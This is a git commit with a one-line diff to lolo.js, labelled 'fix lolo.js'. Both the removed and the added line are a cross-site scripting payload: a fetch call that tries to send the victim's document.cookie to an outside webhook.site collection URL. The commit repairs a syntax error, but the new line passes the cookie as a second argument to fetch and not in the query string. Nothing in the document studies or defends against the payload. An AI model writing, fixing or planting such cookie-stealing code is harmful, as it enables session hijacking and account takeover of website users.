a49275759658552086be331b253fc2e222d22f5c
P4b3l1t0 <59421032+p4b3l1t0@users.noreply.github.com>
2024-02-25 01:22:01 +0400

    fix lolo.js

--- lolo.js
+++ lolo.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/f89622eb-f57a-4338-8ecd-cc027b08a5b5/?cookie='document.cookie)
+fetch('https://webhook.site/f89622eb-f57a-4338-8ecd-cc027b08a5b5/?cookie=',document.cookie);
